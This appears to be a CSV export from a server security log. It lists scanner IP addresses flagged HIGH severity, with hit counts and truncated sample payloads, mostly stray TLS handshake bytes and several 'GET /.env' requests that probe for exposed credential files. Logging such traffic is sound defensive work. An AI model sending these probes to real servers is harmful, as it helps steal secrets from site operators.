IP,SEVERITY,COUNT,SAMPLE_PAYLOAD
147.185.132.225,HIGH,2,"\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03x\xBE\x97\xAA\xF0\xB2Hm\x00\x07s>\xFF\xDAe\x145\xF7~b\xE"
147.185.132.231,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA1\x9C^US\x1E\xD0#\xA7$0\xBA\x08\x84N\xD0\x00\x82T\xF2"
157.245.146.39,HIGH,2,"GET /.env HTTP/1.1"
158.94.211.104,HIGH,2,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03\xA9\x15 4\x1E\xC8\x7F>\xB4gcK\x80`\x0Cy\x1DPV\xE8\x02\x"
159.203.15.132,HIGH,2,"GET /.env HTTP/1.1"
159.203.37.2,HIGH,2,"GET /.env HTTP/1.1"
159.203.6.127,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD6\xDE\xD9\xF6\x8FK\x7F\xA4t\x00\xD1c\xB9\xD4/\x91\xD2w\x9EE"
159.203.95.90,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xCC0\xF5\xD8\x99\xDD,\xE3\x97\x81\xF1\xD5\x18\x18w+*3C \xDCa\"
159.89.197.107,HIGH,2,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF97\x22\x96\x1E}\x94\x90O.\x98\x81\xE9\xBF?\x15\xDFCC\xCB\xA"
162.142.125.120,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03W\x82\xE7\x89\x18\xA8t\xF9\x06[\x9C\xA7\xE7\x85\xA2Z\xF6"
162.142.125.216,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03PKl\x8F!\xF5\x198\xF5My\xB8 \x80`vV\xE3\xFE\xAB\xC2\x02\"
162.142.125.47,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x83\xCC\x82\x1F\xBA\xDE\x05 p\x1Al\xD8W\x049\xEC\x93@\x"
164.92.228.51,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xF7\x7F\xF4\xAE\x9A\xCFa*V\xB0\xDA\xBEm\x88\xA2\x9B\x97"
167.172.177.68,HIGH,2,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03F\xE7*%g\x93'j\x95\x1A\xF9\xB7\xC9{\xD9\xAE7\xB0k\xCD\x8"
167.172.182.95,HIGH,2,"GET /.env HTTP/1.1"
167.71.235.128,HIGH,2,"GET /.env HTTP/1.1"
167.94.138.36,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03k\xC0n\x92 \xF2\xD9\x00\x89\xC32\xB4\xEB-\xCE\xF6.\xEA\x"
167.94.138.51,HIGH,2,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03r\xAAS\xB4\xE8\x9AqI6\xA8\xD9\x9D\xD9=F\xB2\xDD\xB8\x12\"
